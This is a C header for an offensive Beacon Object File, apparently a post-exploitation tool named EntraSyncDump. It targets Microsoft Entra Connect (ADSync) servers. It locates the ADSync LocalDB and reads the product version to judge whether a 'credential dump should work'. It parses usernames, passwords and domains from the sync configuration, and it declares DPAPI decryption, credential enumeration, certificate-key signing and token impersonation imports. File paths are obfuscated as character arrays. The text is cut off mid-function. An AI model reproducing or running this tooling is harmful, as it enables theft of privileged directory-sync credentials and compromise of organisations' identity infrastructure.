#ifndef ENTRASYNCDUMP_COMMON_H
#define ENTRASYNCDUMP_COMMON_H

#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <odbcinst.h>
#include <sqlext.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include <bcrypt.h>

#include "beacon.h"

#pragma comment(lib, "legacy_stdio_definitions.lib")


#ifdef _DEBUG
#ifndef VERBOSE
#define VERBOSE
#endif
#include <stdio.h>
#include <string.h>
#include <winver.h>
#pragma comment(lib, "Version.lib")
#define BeaconPrintf(type, fmt, ...) printf(fmt "\n", __VA_ARGS__)
#endif


// ============================================================================
// DFR imports
// ============================================================================
#ifndef _DEBUG

// KERNEL32
DECLSPEC_IMPORT DWORD KERNEL32$GetLastError();
DECLSPEC_IMPORT HANDLE KERNEL32$GetProcessHeap();
DECLSPEC_IMPORT LPVOID KERNEL32$HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
DECLSPEC_IMPORT BOOL KERNEL32$HeapFree(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
DECLSPEC_IMPORT DWORD KERNEL32$GetFileAttributesW(LPCWSTR lpFileName);
DECLSPEC_IMPORT HANDLE KERNEL32$FindFirstFileW(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData);
DECLSPEC_IMPORT BOOL KERNEL32$FindNextFileW(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);
DECLSPEC_IMPORT BOOL KERNEL32$FindClose(HANDLE hFindFile);
DECLSPEC_IMPORT HANDLE KERNEL32$OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
DECLSPEC_IMPORT BOOL KERNEL32$CloseHandle(HANDLE hObject);
DECLSPEC_IMPORT VOID KERNEL32$GetSystemTimeAsFileTime(LPFILETIME lpSystemTimeAsFileTime);
DECLSPEC_IMPORT HLOCAL KERNEL32$LocalFree(HLOCAL hMem);

// KERNEL32 — process enumeration (only needed for full impersonation chain)
DECLSPEC_IMPORT HANDLE KERNEL32$CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
DECLSPEC_IMPORT BOOL KERNEL32$Process32FirstW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
DECLSPEC_IMPORT BOOL KERNEL32$Process32NextW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);

// MSVCRT
DECLSPEC_IMPORT PVOID MSVCRT$memcpy(PVOID dst, CONST PVOID src, SIZE_T size);
DECLSPEC_IMPORT SIZE_T MSVCRT$wcslen(CONST WCHAR* str);
DECLSPEC_IMPORT WCHAR* MSVCRT$wcsstr(CONST WCHAR* str, CONST WCHAR* strSearch);
DECLSPEC_IMPORT SIZE_T MSVCRT$strlen(CONST CHAR* str);
DECLSPEC_IMPORT INT WINAPIV MSVCRT$sprintf(LPSTR unnamedParam1, LPCSTR unnamedParam2, ...);
DECLSPEC_IMPORT INT MSVCRT$strncmp(CONST CHAR* string1, CONST CHAR* string2, SIZE_T count);
DECLSPEC_IMPORT INT WINAPIV MSVCRT$_snwprintf(WCHAR* buffer, SIZE_T count, CONST WCHAR* format, ...);
DECLSPEC_IMPORT INT MSVCRT$_wcsicmp(CONST WCHAR* string1, CONST WCHAR* string2);
DECLSPEC_IMPORT INT WINAPIV MSVCRT$_snprintf(CHAR* buffer, SIZE_T count, CONST CHAR* format, ...);

// ODBC32
DECLSPEC_IMPORT BOOL ODBCCP32$SQLGetInstalledDriversW(LPSTR lpszBuf, WORD cbBufMax, WORD* pcbBufOut);
DECLSPEC_IMPORT SQLRETURN ODBC32$SQLFetch(SQLHSTMT StatementHandle);
DECLSPEC_IMPORT SQLRETURN ODBC32$SQLDisconnect(SQLHDBC ConnectionHandle);
DECLSPEC_IMPORT SQLRETURN ODBC32$SQLFreeHandle(SQLSMALLINT HandleType, SQLHANDLE Handle);
DECLSPEC_IMPORT SQLRETURN ODBC32$SQLExecDirectW(SQLHSTMT StatementHandle, SQLCHAR* StatementText, SQLINTEGER TextLength);
DECLSPEC_IMPORT SQLRETURN ODBC32$SQLAllocHandle(SQLSMALLINT HandleType, SQLHANDLE InputHandle, SQLHANDLE* OutputHandlePtr);
DECLSPEC_IMPORT SQLRETURN ODBC32$SQLSetEnvAttr(SQLHENV EnvironmentHandle, SQLINTEGER Attribute, SQLPOINTER ValuePtr, SQLINTEGER StringLength);
DECLSPEC_IMPORT SQLRETURN ODBC32$SQLSetConnectAttrW(SQLHDBC ConnectionHandle, SQLINTEGER Attribute, SQLPOINTER ValuePtr, SQLINTEGER StringLength);
DECLSPEC_IMPORT SQLRETURN ODBC32$SQLBindCol(SQLHSTMT StatementHandle, SQLUSMALLINT ColumnNumber, SQLSMALLINT TargetType, SQLPOINTER TargetValuePtr, SQLLEN BufferLength, SQLLEN* StrLen_or_IndPtr);
DECLSPEC_IMPORT SQLRETURN ODBC32$SQLGetDiagRecW(SQLSMALLINT HandleType, SQLHANDLE Handle, SQLSMALLINT RecNumber, SQLCHAR* SQLState, SQLINTEGER* NativeErrorPtr, SQLCHAR* MessageText, SQLSMALLINT BufferLength, SQLSMALLINT* TextLengthPtr);
DECLSPEC_IMPORT SQLRETURN ODBC32$SQLDriverConnectW(SQLHDBC ConnectionHandle, SQLHWND WindowHandle, SQLCHAR* InConnectionString, SQLSMALLINT StringLength1, SQLCHAR* OutConnectionString, SQLSMALLINT BufferLength, SQLSMALLINT* StringLength2Ptr, SQLUSMALLINT DriverCompletion);

// VERSION
DECLSPEC_IMPORT DWORD VERSION$GetFileVersionInfoSizeW(LPCWSTR lptstrFilename, LPDWORD lpdwHandle);
DECLSPEC_IMPORT BOOL VERSION$GetFileVersionInfoW(LPCWSTR lptstrFilename, DWORD dwHandle, DWORD dwLen, LPVOID lpData);
DECLSPEC_IMPORT BOOL VERSION$VerQueryValueW(LPCVOID pBlock, LPCWSTR lpSubBlock, LPVOID* lplpBuffer, PUINT puLen);

// ADVAPI32
DECLSPEC_IMPORT BOOL ADVAPI32$OpenProcessToken(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
DECLSPEC_IMPORT BOOL ADVAPI32$DuplicateTokenEx(HANDLE hExistingToken, DWORD dwDesiredAccess, LPSECURITY_ATTRIBUTES lpTokenAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, TOKEN_TYPE TokenType, PHANDLE phNewToken);
DECLSPEC_IMPORT BOOL ADVAPI32$ImpersonateLoggedOnUser(HANDLE hToken);
DECLSPEC_IMPORT BOOL ADVAPI32$RevertToSelf();
DECLSPEC_IMPORT BOOL ADVAPI32$AdjustTokenPrivileges(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength);
DECLSPEC_IMPORT BOOL ADVAPI32$GetTokenInformation(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength, PDWORD ReturnLength);

// ADVAPI32 — registry
DECLSPEC_IMPORT LONG ADVAPI32$RegOpenKeyExW(HKEY hKey, LPCWSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
DECLSPEC_IMPORT LONG ADVAPI32$RegQueryValueExW(HKEY hKey, LPCWSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
DECLSPEC_IMPORT LONG ADVAPI32$RegEnumKeyExW(HKEY hKey, DWORD dwIndex, LPWSTR lpName, LPDWORD lpcchName, LPDWORD lpReserved, LPWSTR lpClass, LPDWORD lpcchClass, PFILETIME lpftLastWriteTime);
DECLSPEC_IMPORT LONG ADVAPI32$RegCloseKey(HKEY hKey);

// ADVAPI32 — credential store
DECLSPEC_IMPORT BOOL ADVAPI32$CredEnumerateW(LPCWSTR Filter, DWORD Flags, DWORD* Count, PVOID* Credentials);
DECLSPEC_IMPORT VOID ADVAPI32$CredFree(PVOID Buffer);

// CRYPT32 — DPAPI
DECLSPEC_IMPORT BOOL CRYPT32$CryptUnprotectData(DATA_BLOB* pDataIn, LPWSTR* ppszDataDescr, DATA_BLOB* pOptionalEntropy, PVOID pvReserved, PVOID pPromptStruct, DWORD dwFlags, DATA_BLOB* pDataOut);

// CRYPT32
DECLSPEC_IMPORT HCERTSTORE CRYPT32$CertOpenStore(LPCSTR lpszStoreProvider, DWORD dwEncodingType, ULONG_PTR hCryptProv, DWORD dwFlags, CONST void* pvPara);
DECLSPEC_IMPORT PCCERT_CONTEXT CRYPT32$CertFindCertificateInStore(HCERTSTORE hCertStore, DWORD dwCertEncodingType, DWORD dwFindFlags, DWORD dwFindType, CONST void* pvFindPara, PCCERT_CONTEXT pPrevCertContext);
DECLSPEC_IMPORT BOOL CRYPT32$CertFreeCertificateContext(PCCERT_CONTEXT pCertContext);
DECLSPEC_IMPORT BOOL CRYPT32$CertCloseStore(HCERTSTORE hCertStore, DWORD dwFlags);
DECLSPEC_IMPORT BOOL CRYPT32$CryptAcquireCertificatePrivateKey(PCCERT_CONTEXT pCert, DWORD dwFlags, void* pvParameters, ULONG_PTR* phCryptProvOrNCryptKey, DWORD* pdwKeySpec, BOOL* pfCallerFreeProvOrNCryptKey);

// NCRYPT
DECLSPEC_IMPORT LONG NCRYPT$NCryptSignHash(ULONG_PTR hKey, VOID* pPaddingInfo, PUCHAR pbHashValue, DWORD cbHashValue, PUCHAR pbSignature, DWORD cbSignature, DWORD* pcbResult, DWORD dwFlags);
DECLSPEC_IMPORT LONG NCRYPT$NCryptGetProperty(ULONG_PTR hObject, LPCWSTR pszProperty, PBYTE pbOutput, DWORD cbOutput, DWORD* pcbResult, DWORD dwFlags);
DECLSPEC_IMPORT LONG NCRYPT$NCryptFreeObject(ULONG_PTR hObject);

// BCRYPT
DECLSPEC_IMPORT NTSTATUS BCRYPT$BCryptOpenAlgorithmProvider(BCRYPT_ALG_HANDLE* phAlgorithm, LPCWSTR pszAlgId, LPCWSTR pszImplementation, ULONG dwFlags);
DECLSPEC_IMPORT NTSTATUS BCRYPT$BCryptCloseAlgorithmProvider(BCRYPT_ALG_HANDLE hAlgorithm, ULONG dwFlags);
DECLSPEC_IMPORT NTSTATUS BCRYPT$BCryptHash(BCRYPT_ALG_HANDLE hAlgorithm, PUCHAR pbSecret, ULONG cbSecret, PUCHAR pbInput, ULONG cbInput, PUCHAR pbOutput, ULONG cbOutput);
DECLSPEC_IMPORT NTSTATUS BCRYPT$BCryptGenRandom(BCRYPT_ALG_HANDLE hAlgorithm, PUCHAR pbBuffer, ULONG cbBuffer, ULONG dwFlags);
DECLSPEC_IMPORT NTSTATUS BCRYPT$BCryptSetProperty(BCRYPT_ALG_HANDLE hObject, LPCWSTR pszProperty, PUCHAR pbInput, ULONG cbInput, ULONG dwFlags);
DECLSPEC_IMPORT NTSTATUS BCRYPT$BCryptGenerateSymmetricKey(BCRYPT_ALG_HANDLE hAlgorithm, BCRYPT_KEY_HANDLE* phKey, PUCHAR pbKeyObject, ULONG cbKeyObject, PUCHAR pbSecret, ULONG cbSecret, ULONG dwFlags);
DECLSPEC_IMPORT NTSTATUS BCRYPT$BCryptDecrypt(BCRYPT_KEY_HANDLE hKey, PUCHAR pbInput, ULONG cbInput, VOID* pPaddingInfo, PUCHAR pbIV, ULONG cbIV, PUCHAR pbOutput, ULONG cbOutput, ULONG* pcbResult, ULONG dwFlags);
DECLSPEC_IMPORT NTSTATUS BCRYPT$BCryptDestroyKey(BCRYPT_KEY_HANDLE hKey);

#endif


// ============================================================================
// API macro
// ============================================================================
#ifdef _DEBUG
#define API(x, y) y
#else
#define API(x, y) x##$##y
#endif


// ============================================================================
// Constants and macros
// ============================================================================
#define BofHeapAlloc(size) API(KERNEL32, HeapAlloc)(API(KERNEL32, GetProcessHeap)(), HEAP_ZERO_MEMORY, size)
#define BofHeapFree(buf) API(KERNEL32, HeapFree)(API(KERNEL32, GetProcessHeap)(), NULL, buf)

#ifdef VERBOSE
#define VerbosePrintf(...) BeaconPrintf(__VA_ARGS__)
#else
#define VerbosePrintf(...) ((void)0)
#endif

#define IS_SQL_SUCCESS(r) (r == SQL_SUCCESS || r == SQL_SUCCESS_WITH_INFO)

#define CONNECT_TIMEOUT 5
#define CONFIG_SIZE 1024 * 32

#define ENTRACONNECT_V2_MAJOR 2
#define ENTRACONNECT_ABA_PREVIEW_MINOR 4
#define ENTRACONNECT_ABA_GA_MINOR      6

#define JWT_MAX_HEADER  256
#define JWT_MAX_CLAIMS  1024
#define JWT_MAX_B64     4096
#define JWT_MAX_ASSERTION 8192


// ============================================================================
// Types
// ============================================================================
typedef struct {
    LPCWSTR pszAlgId;
} MY_BCRYPT_PKCS1_PADDING_INFO;

#ifndef BCRYPT_PAD_PKCS1
#define BCRYPT_PAD_PKCS1 0x00000002
#endif
#ifndef CERT_STORE_PROV_SYSTEM_W
#define CERT_STORE_PROV_SYSTEM_W ((LPCSTR)10)
#endif
#ifndef CERT_SYSTEM_STORE_CURRENT_USER
#define CERT_SYSTEM_STORE_CURRENT_USER 0x00010000
#endif
#ifndef CERT_STORE_OPEN_EXISTING_FLAG
#define CERT_STORE_OPEN_EXISTING_FLAG 0x00004000
#endif
#ifndef CERT_FIND_HASH
#define CERT_FIND_HASH 0x00010000
#endif
#ifndef CRYPT_ACQUIRE_ONLY_NCRYPT_KEY_FLAG
#define CRYPT_ACQUIRE_ONLY_NCRYPT_KEY_FLAG 0x00040000
#endif
#ifndef CRYPT_ACQUIRE_SILENT_FLAG
#define CRYPT_ACQUIRE_SILENT_FLAG 0x00000040
#endif
#ifndef CERT_NCRYPT_KEY_SPEC
#define CERT_NCRYPT_KEY_SPEC 0xFFFFFFFF
#endif

typedef struct {
    DWORD Flags;
    DWORD Type;
    LPWSTR TargetName;
    LPWSTR Comment;
    FILETIME LastWritten;
    DWORD CredentialBlobSize;
    LPBYTE CredentialBlob;
    DWORD Persist;
    DWORD AttributeCount;
    PVOID Attributes;
    LPWSTR TargetAlias;
    LPWSTR UserName;
} BOF_CREDENTIALW, *PBOF_CREDENTIALW;

static CONST CHAR b64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

typedef struct {
    BOOL  found;
    DWORD major;
    DWORD minor;
    DWORD build;
    DWORD revision;
    CONST WCHAR* filePath;
} ENTRACONNECT_VERSION;


// ============================================================================
// String utility functions
// ============================================================================

static CHAR* html_unescape(CHAR* str) {
    INT len = API(MSVCRT, strlen)(str);
    CHAR* result = BofHeapAlloc(len + 1);
    INT offset = 0;

    for (INT i = 0; i < len; i++) {
        if (str[i] == '&') {
            if (API(MSVCRT, strncmp)(str + i, "&lt;", 4) == 0) {
                result[offset++] = '<';
                i += 3;
            }
            else if (API(MSVCRT, strncmp)(str + i, "&gt;", 4) == 0) {
                result[offset++] = '>';
                i += 3;
            }
            else if (API(MSVCRT, strncmp)(str + i, "&amp;", 5) == 0) {
                result[offset++] = '&';
                i += 4;
            }
            else {
                result[offset++] = str[i];
            }
        }
        else {
            result[offset++] = str[i];
        }
    }

    result[offset] = '\0';
    return result;
}

static CONST CHAR* ptnscan(CONST CHAR* haystack, CONST CHAR* needle) {
    INT haystackLen = API(MSVCRT, strlen)(haystack);
    INT needleLen = API(MSVCRT, strlen)(needle);

    for (INT i = 0; i < haystackLen - needleLen; i++) {
        for (INT j = 0; j < needleLen; j++) {
            if (needle[j] == '?') {
                continue;
            }

            if (haystack[i + j] != needle[j]) {
                break;
            }

            if (j == needleLen - 1) {
                return &haystack[i];
            }
        }
    }

    return NULL;
}

static CONST CHAR* find_username(CONST CHAR* xml) {
    CONST CHAR* usernameStart = ptnscan(xml, "name=?UserName? type=");
    if (!usernameStart) return NULL;
    CONST CHAR* valueStart = ptnscan(usernameStart, ">");
    if (!valueStart) return NULL;
    valueStart++;
    CONST CHAR* valueEnd = ptnscan(valueStart, "</parameter>");
    size_t size = (ptrdiff_t)valueEnd - (ptrdiff_t)valueStart;
    CHAR* unescaped = (CHAR*)BofHeapAlloc(size + 1);
    if (!unescaped) {
        return NULL;
    }

    API(MSVCRT, memcpy)(unescaped, valueStart, size);
    unescaped[size] = '\x00';

    CHAR* escaped = html_unescape(unescaped);
    BofHeapFree(unescaped);
    return escaped;
}

static CONST CHAR* find_password(CONST CHAR* xml) {
    CONST CHAR* start = ptnscan(xml, "name=?Password? type=");
    if (!start) return NULL;
    CONST CHAR* valueStart = ptnscan(start, ">");
    if (!valueStart) return NULL;
    valueStart++;
    CONST CHAR* valueEnd = ptnscan(valueStart, "</parameter>");
    if (!valueEnd || valueEnd <= valueStart) return NULL;
    size_t size = (ptrdiff_t)valueEnd - (ptrdiff_t)valueStart;
    CHAR* result = (CHAR*)BofHeapAlloc(size + 1);
    if (!result) return NULL;
    API(MSVCRT, memcpy)(result, valueStart, size);
    result[size] = '\0';
    return result;
}

static CONST CHAR* find_domain(CONST CHAR* xml) {
    CONST CHAR* start = ptnscan(xml, "name=?forest-login-domain? type=");
    if (!start) {
        start = ptnscan(xml, "name=?Domain? type=");
    }
    if (!start) return NULL;
    CONST CHAR* valueStart = ptnscan(start, ">");
    if (!valueStart) return NULL;
    valueStart++;
    CONST CHAR* valueEnd = ptnscan(valueStart, "</parameter>");
    if (!valueEnd || valueEnd <= valueStart) return NULL;
    size_t size = (ptrdiff_t)valueEnd - (ptrdiff_t)valueStart;
    CHAR* result = (CHAR*)BofHeapAlloc(size + 1);
    if (!result) return NULL;
    API(MSVCRT, memcpy)(result, valueStart, size);
    result[size] = '\0';
    CHAR* unescaped = html_unescape(result);
    BofHeapFree(result);
    return unescaped;
}

static CONST CHAR* find_xml_element(CONST CHAR* xml, CONST CHAR* openTag, CONST CHAR* closeTag) {
    CONST CHAR* start = ptnscan(xml, openTag);
    if (!start) return NULL;
    CONST CHAR* valueStart = start + API(MSVCRT, strlen)(openTag);
    CONST CHAR* valueEnd = ptnscan(valueStart, closeTag);
    if (!valueEnd || valueEnd <= valueStart) return NULL;
    size_t size = (ptrdiff_t)valueEnd - (ptrdiff_t)valueStart;
    CHAR* result = (CHAR*)BofHeapAlloc(size + 1);
    if (!result) return NULL;
    API(MSVCRT, memcpy)(result, valueStart, size);
    result[size] = '\0';
    CHAR* unescaped = html_unescape(result);
    BofHeapFree(result);
    return unescaped;
}

static CONST CHAR* find_clientid(CONST CHAR* xml) {
    CONST CHAR* start = ptnscan(xml, "name=?UserName? type=");
    if (!start) {
        return NULL;
    }
    CONST CHAR* valueStart = ptnscan(start, ">") + 1;
    CONST CHAR* valueEnd   = ptnscan(valueStart, "</parameter>");
    if (!valueEnd || valueEnd <= valueStart) {
        return NULL;
    }
    size_t size = (ptrdiff_t)valueEnd - (ptrdiff_t)valueStart;
    CHAR* result = (CHAR*)BofHeapAlloc(size + 1);
    if (!result) {
        return NULL;
    }
    API(MSVCRT, memcpy)(result, valueStart, size);
    result[size] = '\x00';
    CHAR* unescaped = html_unescape(result);
    BofHeapFree(result);
    return unescaped;
}


// ============================================================================
// SQL helper
// ============================================================================

static CONST SQLWCHAR* get_last_sql_error(SQLHDBC sqlConnHandle, SQLRETURN sqlResult) {
    SQLWCHAR sqlState[6], errorMessage[SQL_MAX_MESSAGE_LENGTH];
    SQLINTEGER nativeError;
    SQLSMALLINT messageLength;
    CONST WCHAR format[] = L"Return code: 0x%x; SQL state: %ls; Native error: %d; Message: %ls";

    static SQLWCHAR message[SQL_MAX_MESSAGE_LENGTH + sizeof(format) + sizeof(sqlState) + 8 + 8];

    API(ODBC32, SQLGetDiagRecW)(SQL_HANDLE_DBC, sqlConnHandle, 1, sqlState, &nativeError, errorMessage, SQL_MAX_MESSAGE_LENGTH, &messageLength);
    API(MSVCRT, _snwprintf)(message, sizeof(message) / sizeof(message[0]) - 1, format, sqlResult, sqlState, nativeError, errorMessage);
    return message;
}


// ============================================================================
// Version / instance discovery
// ============================================================================

static CONST WCHAR* find_localdb_instance() {
    static WCHAR instanceName[260];
    WIN32_FIND_DATAW findData = { 0 };
    INT i;
    WCHAR wLdbSearch[] = { 'C',':','\\','W','i','n','d','o','w','s','\\','S','e','r','v','i','c','e','P','r','o','f','i','l','e','s','\\','A','D','S','y','n','c','\\','A','p','p','D','a','t','a','\\','L','o','c','a','l','\\','M','i','c','r','o','s','o','f','t','\\','M','i','c','r','o','s','o','f','t',' ','S','Q','L',' ','S','e','r','v','e','r',' ','L','o','c','a','l',' ','D','B','\\','I','n','s','t','a','n','c','e','s','\\','A','D','S','y','n','c','*',0 };
    HANDLE hFind = API(KERNEL32, FindFirstFileW)(wLdbSearch, &findData);
    if (hFind == INVALID_HANDLE_VALUE) {
        return NULL;
    }

    do {
        if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        if (findData.cFileName[0] == L'.') continue;

        i = 0;
        while (findData.cFileName[i] && i < 259) {
            instanceName[i] = findData.cFileName[i];
            i++;
        }
        instanceName[i] = L'\0';
        API(KERNEL32, FindClose)(hFind);
        return instanceName;
    } while (API(KERNEL32, FindNextFileW)(hFind, &findData));

    API(KERNEL32, FindClose)(hFind);
    return NULL;
}

static CONST WCHAR* resolve_localdb_instance(CONST WCHAR* override) {
    CONST WCHAR* discovered;
    if (override) {
        VerbosePrintf(CALLBACK_OUTPUT, "Using specified instance: %ls\n", override);
        return override;
    }
    discovered = find_localdb_instance();
    if (discovered) {
        VerbosePrintf(CALLBACK_OUTPUT, "Discovered instance: %ls\n", discovered);
        return discovered;
    }
    return NULL;
}

static BOOL read_entra_version(ENTRACONNECT_VERSION* ver) {
    WCHAR wPath1[] = { 'C',':','\\','P','r','o','g','r','a','m',' ','F','i','l','e','s','\\','M','i','c','r','o','s','o','f','t',' ','A','z','u','r','e',' ','A','c','t','i','v','e',' ','D','i','r','e','c','t','o','r','y',' ','C','o','n','n','e','c','t','\\','A','D','S','y','n','c','\\','B','i','n','\\','A','D','S','y','n','c','.','e','x','e',0 };
    WCHAR wPath2[] = { 'C',':','\\','P','r','o','g','r','a','m',' ','F','i','l','e','s','\\','M','i','c','r','o','s','o','f','t',' ','A','z','u','r','e',' ','A','c','t','i','v','e',' ','D','i','r','e','c','t','o','r','y',' ','C','o','n','n','e','c','t','\\','A','z','u','r','e','A','D','C','o','n','n','e','c','t','.','e','x','e',0 };
    CONST WCHAR* candidatePaths[] = { wPath1, wPath2 };
    CONST INT numPaths = 2;

    ver->found    = FALSE;
    ver->filePath = NULL;

    for (INT i = 0; i < numPaths; i++) {
        if (API(KERNEL32, GetFileAttributesW)(candidatePaths[i]) != INVALID_FILE_ATTRIBUTES) {
            ver->filePath = candidatePaths[i];
            break;
        }
    }

    if (!ver->filePath) {
        return FALSE;
    }

    DWORD dummy = 0;
    DWORD infoSize = API(VERSION, GetFileVersionInfoSizeW)(ver->filePath, &dummy);
    if (!infoSize) {
        return FALSE;
    }

    BYTE* verBuf = BofHeapAlloc(infoSize);
    if (!verBuf) {
        return FALSE;
    }

    if (!API(VERSION, GetFileVersionInfoW)(ver->filePath, 0, infoSize, verBuf)) {
        BofHeapFree(verBuf);
        return FALSE;
    }

    VS_FIXEDFILEINFO* ffi = NULL;
    UINT ffiLen = 0;
    if (!API(VERSION, VerQueryValueW)(verBuf, L"\\", (LPVOID*)&ffi, &ffiLen) || ffiLen == 0) {
        BofHeapFree(verBuf);
        return FALSE;
    }

    ver->major    = HIWORD(ffi->dwFileVersionMS);
    ver->minor    = LOWORD(ffi->dwFileVersionMS);
    ver->build    = HIWORD(ffi->dwFileVersionLS);
    ver->revision = LOWORD(ffi->dwFileVersionLS);
    ver->found    = TRUE;

    BofHeapFree(verBuf);
    return TRUE;
}

static CONST CHAR* classify_auth_type(CONST ENTRACONNECT_VERSION* ver, CONST CHAR** authNote) {
    if (ver->major < 2 || (ver->major == 2 && ver->minor < ENTRACONNECT_ABA_PREVIEW_MINOR)) {
        *authNote = "Credential dump should work directly.";
        return "Password (Sync_* / MSOL_* user principal)";
    } else if (ver->major == 2 && ver->minor < ENTRACONNECT_ABA_GA_MINOR) {
        *authNote = "Credential dump will work if this install was NOT migrated to Application-Based Authentication (ABA).";
        return "Password by default (ABA/certificate available as preview - v2.4+)";
    } else {
        *authNote = "Credential dump will only work if this install was NOT migrated to ABA. Servers upgraded from older versions may still use password. Run dumpcertinfo to check.";
        return "Application-Based Authentication / certificate (default for new installs - v2.6+)";
    }
}


// ============================================================================
// Crypto / encoding helpers
// ============================================================================

static INT hex_nibble(CHAR c) {
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    return -1;
}

static INT hex_to_bytes(CONST CHAR* hexStr, BYTE* outBuf, INT maxLen) {
    INT len = API(MSVCRT, strlen)(hexStr);
    INT count = 0;
    for (INT i = 0; i + 1 < len && count < maxLen; i += 2) {
        INT hi = hex_nibble(hexStr[i]);
        INT lo = hex_nibble(hexStr[i + 1]);
        if (hi < 0 || lo < 0) return -1;
        outBuf[count++] = (BYTE)((hi << 4) | lo);
    }
    return count;
}

static CHAR* base64_encode(CONST BYTE* data, INT len) {
    INT outLen = 4 * ((len + 2) / 3);
    CHAR* out = BofHeapAlloc(outLen + 1);
    if (!out) return NULL;

    INT i, j;
    for (i = 0, j = 0; i < len; ) {
        INT start = i;
        DWORD a = (i < len) ? data[i++] : 0;
        DWORD b = (i < len) ? data[i++] : 0;
        DWORD c = (i < len) ? data[i++] : 0;
        INT consumed = i - start;
        DWORD triple = (a << 16) | (b << 8) | c;

        out[j++] = b64_table[(triple >> 18) & 0x3F];
        out[j++] = b64_table[(triple >> 12) & 0x3F];
        out[j++] = (consumed >= 2) ? b64_table[(triple >> 6) & 0x3F] : '=';
        out[j++] = (consumed >= 3) ? b64_table[triple & 0x3F] : '=';
    }
    out[j] = '\0';
    return out;
}

static INT base64_decode(CONST CHAR* input, BYTE* output, INT maxLen) {
    INT len = API(MSVCRT, strlen)(input);
    INT i, j, pad = 0;
    DWORD sextet[4];

    if (len % 4 != 0) return -1;
    if (len > 0 && input[len - 1] == '=') pad++;
    if (len > 1 && input[len - 2] == '=') pad++;

    INT outLen = (len / 4) * 3 - pad;
    if (outLen > maxLen) return -1;

    for (i = 0, j = 0; i < len; i += 4) {
        for (INT k = 0; k < 4; k++) {
            CHAR c = input[i + k];
            if (c >= 'A' && c <= 'Z') sextet[k] = c - 'A';
            else if (c >= 'a' && c <= 'z') sextet[k] = c - 'a' + 26;
            else if (c >= '0' && c <= '9') sextet[k] = c - '0' + 52;
            else if (c == '+') sextet[k] = 62;
            else if (c == '/') sextet[k] = 63;
            else if (c == '=') sextet[k] = 0;
            else return -1;
        }
        DWORD triple = (sextet[0] << 18) | (sextet[1] << 12) | (sextet[2] << 6) | sextet[3];
        if (j < outLen) output[j++] = (BYTE)((triple >> 16) & 0xFF);
        if (j < outLen) output[j++] = (BYTE)((triple >> 8) & 0xFF);
        if (j < outLen) output[j++] = (BYTE)(triple & 0xFF);
    }
    return outLen;
}

static INT guid_string_to_bytes(CONST CHAR* guidStr, BYTE* out16) {
    CHAR clean[33];
    INT ci = 0;
    for (INT i = 0; guidStr[i] && ci < 32; i++) {
        CHAR c = guidStr[i];
        if (c == '-' || c == '{' || c == '}' || c == ' ') continue;
        clean[ci++] = c;
    }
    if (ci != 32) return -1;
    clean[32] = '\0';

    BYTE raw[16];
    for (INT i = 0; i < 16; i++) {
        INT hi = hex_nibble(clean[i * 2]);
        INT lo = hex_nibble(clean[i * 2 + 1]);
        if (hi < 0 || lo < 0) return -1;
        raw[i] = (BYTE)((hi << 4) | lo);
    }

    out16[0] = raw[3]; out16[1] = raw[2]; out16[2] = raw[1]; out16[3] = raw[0];
    out16[4] = raw[5]; out16[5] = raw[4];
    out16[6] = raw[7]; out16[7] = raw[6];
    for (INT i = 8; i < 16; i++) out16[i] = raw[i];
    return 16;
}

static CHAR* base64url_encode(CONST BYTE* data, INT len) {
    CHAR* b64 = base64_encode(data, len);
    if (!b64) return NULL;

    for (INT i = 0; b64[i]; i++) {
        if (b64[i] == '+') b64[i] = '-';
        else if (b64[i] == '/') b64[i] = '_';
    }
    INT slen = API(MSVCRT, strlen)(b64);
    while (slen > 0 && b64[slen - 1] == '=') {
        b64[--slen] = '\0';
    }
    return b64;
}

static LONGLONG get_unix_time() {
    FILETIME ft;
    API(KERNEL32, GetSystemTimeAsFileTime)(&ft);
    ULARGE_INTEGER uli;
    uli.LowPart = ft.dwLowDateTime;
    uli.HighPart = ft.dwHighDateTime;
    return (LONGLONG)((uli.QuadPart - 116444736000000000ULL) / 10000000ULL);
}

static CHAR* generate_guid_string() {
    BYTE guidBytes[16];
    NTSTATUS status = API(BCRYPT, BCryptGenRandom)(NULL, guidBytes, 16, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    if (status != 0) {
        return NULL;
    }
    guidBytes[6] = (guidBytes[6] & 0x0F) | 0x40;
    guidBytes[8] = (guidBytes[8] & 0x3F) | 0x80;

    CHAR* guid = BofHeapAlloc(37);
    if (!guid) return NULL;
    API(MSVCRT, _snprintf)(guid, 37,
        "%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x",
        guidBytes[0], guidBytes[1], guidBytes[2], guidBytes[3],
        guidBytes[4], guidBytes[5],
        guidBytes[6], guidBytes[7],
        guidBytes[8], guidBytes[9],
        guidBytes[10], guidBytes[11], guidBytes[12], guidBytes[13], guidBytes[14], guidBytes[15]);
    return guid;
}


// ============================================================================
// Impersonation helpers
// ============================================================================

static BOOL enable_debug_privilege() {
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES tp;

